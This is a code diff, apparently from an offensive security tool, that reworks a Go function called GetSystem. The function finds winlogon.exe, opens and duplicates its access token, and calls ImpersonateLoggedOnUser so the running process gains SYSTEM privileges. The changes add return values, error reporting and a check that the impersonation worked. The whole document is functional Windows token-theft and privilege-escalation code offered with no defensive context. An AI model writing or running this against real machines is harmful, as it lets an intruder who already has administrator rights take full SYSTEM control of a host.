@@ -51,22 +51,25 @@ func DefaultDisplayOptions() *DisplayOptions {
 	}
 }
 
-func GetSystem() {
+func GetSystem() bool {
 	isHighIntegrity := IsHighIntegrity()
 	if !isHighIntegrity {
-		return
+		fmt.Println("Not running with high integrity")
+		return false
 	}
 
 	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
-		return
+		fmt.Printf("CreateToolhelp32Snapshot failed: %v\n", err)
+		return false
 	}
 	defer windows.CloseHandle(snapshot)
 
 	var procEntry windows.ProcessEntry32
 	procEntry.Size = uint32(unsafe.Sizeof(procEntry))
 	if err := windows.Process32First(snapshot, &procEntry); err != nil {
-		return
+		fmt.Printf("Process32First failed: %v\n", err)
+		return false
 	}
 
 	for {
@@ -78,73 +81,84 @@ func GetSystem() {
 				procEntry.ProcessID,
 			)
 			if err != nil {
-				return
+				fmt.Printf("OpenProcess failed: %v\n", err)
+				return false
 			}
 			defer windows.CloseHandle(handle)
 
 			fmt.Printf("winlogon handle obtained\n")
 
 			var token windows.Token
-			err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE, &token)
+			err = windows.OpenProcessToken(handle, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY|windows.TOKEN_QUERY_SOURCE, &token)
 			if err != nil {
-				return
+				fmt.Printf("OpenProcessToken failed: %v\n", err)
+				return false
 			}
 			defer token.Close()
 
 			fmt.Printf("token obtained: %v\n", token)
-			orig_user, err := token.GetTokenUser()
-			orig_group, err := token.GetTokenPrimaryGroup()
 
-			fmt.Printf("orig_user: %v\n", orig_user)
-			fmt.Printf("orig_group: %v\n", orig_group)
+			// Get original token info for debugging
+			orig_user, err := token.GetTokenUser()
+			if err != nil {
+				fmt.Printf("Failed to get original token user: %v\n", err)
+			}
+			orig_sid := orig_user.User.Sid.String()
+			fmt.Printf("Original token SID: %s\n", orig_sid)
 
 			var duplicateToken windows.Token
-			err = windows.DuplicateTokenEx(token, windows.TOKEN_ALL_ACCESS, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &duplicateToken)
+			err = windows.DuplicateTokenEx(
+				token,
+				windows.TOKEN_ALL_ACCESS,
+				nil,
+				windows.SecurityImpersonation,
+				windows.TokenImpersonation,
+				&duplicateToken,
+			)
 			if err != nil {
-				fmt.Printf("DuplicateTokenEx failed: %v", err)
-				return
+				fmt.Printf("DuplicateTokenEx failed: %v\n", err)
+				return false
 			}
 			defer duplicateToken.Close()
 
+			// Get duplicate token info for debugging
 			dupeUser, err := duplicateToken.GetTokenUser()
 			if err != nil {
 				fmt.Printf("Failed to get duplicate token user: %v\n", err)
 			} else {
 				sidStr := dupeUser.User.Sid.String()
-				fmt.Printf("Duplicate token user SID before impersonation: %s\n", sidStr)
+				fmt.Printf("Duplicate token SID before impersonation: %s\n", sidStr)
 			}
 
-			fmt.Printf("duplicateToken: %v\n", duplicateToken)
-
-			dupe_user, err := duplicateToken.GetTokenUser()
-			dupe_group, err := duplicateToken.GetTokenPrimaryGroup()
-
-			fmt.Printf("dupe_user: %v\n", dupe_user)
-			fmt.Printf("dupe_group: %v\n", dupe_group)
-
-			ret, _, err := dll.ImpersonateLoggedOnUser.Call(uintptr(duplicateToken))
-			if ret != 0 {
-				fmt.Printf("SYSTEM impersonated!")
-				return
+			ret, _, errNo := dll.ImpersonateLoggedOnUser.Call(uintptr(duplicateToken))
+			if ret == 0 {
+				fmt.Printf("ImpersonateLoggedOnUser failed with error: %v\n", errNo)
+				return false
 			}
 
+			// Verify impersonation worked
 			isSystem := IsSystem()
 			if !isSystem {
-				return
-			} else {
-				return
+				fmt.Println("Impersonation failed - not running as SYSTEM")
+				return false
 			}
+
+			fmt.Println("Successfully impersonated SYSTEM")
+			return true
 		}
 
-		err := windows.Process32Next(snapshot, &procEntry)
+		err = windows.Process32Next(snapshot, &procEntry)
 		if err != nil {
 			if err == windows.ERROR_NO_MORE_FILES {
 				break
 			}
-			return
+			fmt.Printf("Process32Next failed: %v\n", err)
+			return false
 		}
 	}
-	return
+
+	fmt.Println("Failed to find winlogon.exe")
+	return false
 }
 
 func IsSystem() bool {
